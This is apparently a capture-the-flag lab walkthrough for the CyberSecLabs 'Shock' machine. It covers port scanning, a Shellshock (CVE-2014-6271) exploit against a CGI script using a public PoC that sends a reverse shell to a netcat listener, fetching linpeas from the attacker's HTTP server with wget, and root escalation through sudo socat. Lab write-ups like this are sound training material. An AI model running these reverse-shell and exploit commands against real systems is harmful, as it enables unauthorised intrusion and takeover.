---
description: https://www.cyberseclabs.co.uk/labs/info/Shock/
---

# Shock

![](<../../../.gitbook/assets/image (658) (1).png>)

## Nmap

```
nmap 172.31.1.3 -p- -A

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12:ee:09:94:d5:4b:4a:d9:3b:95:3a:d6:63:e7:98:6f (RSA)
|   256 b9:f8:52:aa:62:02:af:6c:09:ca:dc:3e:7b:b3:94:b7 (ECDSA)
|_  256 53:5d:98:f7:61:e0:57:df:38:96:f9:be:59:77:6c:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Steak House Shock
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP

Looking at our Nmap results we can start with a check on anonymous login check with FTP.

```
nmap 172.31.1.3 --script=ftp-anon.nse -p 21

PORT   STATE SERVICE
21/tcp open  ftp
```

We get no feedback regarding anonymous login and will require a manual check.

![](<../../../.gitbook/assets/image (659).png>)

As anonymous login for this server is not allowed we can check for exploits on vsFTPd 3.0.3 using searchsploit.

![](<../../../.gitbook/assets/image (660).png>)

I also Google searched and found no current exploits for vsFTPd 3.0.3. We can next take a look at HTTP on port 80 since this is our next best logical attack vector.

## HTTP

![http://172.31.1.3/](<../../../.gitbook/assets/image (661).png>)

I have also started a scan with Nikto on this webpage.

![](<../../../.gitbook/assets/image (662) (1).png>)

## Exploitation

Nikto reports a possible exploit on /cgi-bin/test.cgi to the Shellshock exploit. A brief overview of what is is taken from [www.netsparker.com](https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/)

![](<../../../.gitbook/assets/image (664).png>)

### PoC

Searching for HTTP Shellshock PoC's brings us to the following by zalalov on Github.

{% embed url="https://github.com/zalalov/CVE-2014-6271" %}

Download the python script and then set up as per the README:

![](<../../../.gitbook/assets/image (665).png>)

Start a netcat listener on the attacking machine.

```
nc -lvp 4444
```

Then call the Python script with the correct arguments for our machine.

```
python2 shellshock.py 172.31.1.3 /cgi-bin/test.cgi <AttackingIP>/4444
```

![](<../../../.gitbook/assets/image (666).png>)

After a short amount of time we should get a shell back on our listener.

![](<../../../.gitbook/assets/image (667).png>)

From here we can perform an upgrade on the shell we currently have.

```
/usr/bin/script -qc /bin/bash /dev/null
```

## Privilege Escalation

Next I uploaded linpeas.sh in the attempt to look for any easy privilege escalation vectors. I started a Python SimpleHTTPServer on my attacking machine pointing at my Linux enumeration scripts.

```
Python2 -m SimpleHTTPServer 80
```

I then performed `wget` on the target file.

```
wget http://<IP>:<Port>/<File>
```

![](<../../../.gitbook/assets/image (668).png>)

Once completed I executed linpeas.sh and waited for it to complete. Once complete we see we have access to socat using sudo.

![](<../../../.gitbook/assets/image (669) (1).png>)

Looking at socat on [GTFObins](https://gtfobins.github.io/gtfobins/socat/) we see we can call bash with root permissions.

![](<../../../.gitbook/assets/image (670) (1).png>)

![](<../../../.gitbook/assets/image (671).png>)

We are now root on the target machine.
